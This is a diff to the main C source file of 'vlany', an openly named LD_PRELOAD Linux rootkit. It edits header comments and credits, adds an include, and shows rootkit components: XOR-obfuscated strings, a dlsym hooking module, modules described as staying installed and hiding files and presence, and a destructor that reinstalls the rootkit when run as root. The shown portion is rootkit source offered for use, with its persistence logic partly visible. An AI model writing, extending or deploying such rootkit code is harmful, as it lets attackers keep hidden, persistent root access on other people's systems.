@@ -20,30 +20,30 @@
  *                easy-to-use installation script,
  *                incredibly robust configuration
  *                     
- *  contact: mem@xmpp.is, @mempodippy
- *  btc addr: 1FfLiA4P5KHzKUHgCnMCVguJUgYJ8edW4B
+ *  -- EXPERIMENTAL PROJECT..CODE SUBJECT TO CHANGE --
+ *  --     WATCH OUT FOR NASTY VERSIONS OF VLANY    --
  *
- *  credits:
+ *  Credits:
  *    http://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/
  *    https://www.youtube.com/watch?v=oYgmwwlcLc0
+ *    You know who you are.
  */
 
 #define _GNU_SOURCE
 
 // constants defined by config.py at runtime. all (important) strings are xor'd
 #include "symbols/headers/const.h"
-
 // list of linux includes and library headers used by vlany
 #include "symbols/headers/includes.h"
-
 // modified libc symbol prototypes
 #include "symbols/headers/symbols.h"
 
 // rootkit utilities
 #include "symbols/util/xor.c" // (void xor(), void cleanup())
 #include "symbols/util/owned.c" // (int owned())
+#include "symbols/util/ver_acc_exist.c" // (int ver_acc_exist())
 
-// functions used to stay installed, hide files, forge files, and hide presence
+// functions and some hooks used to stay installed, hide files, forge files, and hide presence
 #include "symbols/hiding/libdl/dlsym.c" // (void *dlsym(), void locate_dlsym(), void *locate_sym())
 #include "symbols/util/dup.c" // (char *dup_call())
 #include "symbols/util/procname.h" // (char *procname_self())
@@ -320,3 +320,5 @@ void __attribute ((destructor)) vexit (void)
     if(check_presence && errno != ENOENT && geteuid() == 0) { closedir(check_presence); reinstall(); }
     CLEAN(install_dir);
 }
+
+// i can type any joke i want but it doesn't matter if you're dyslexic
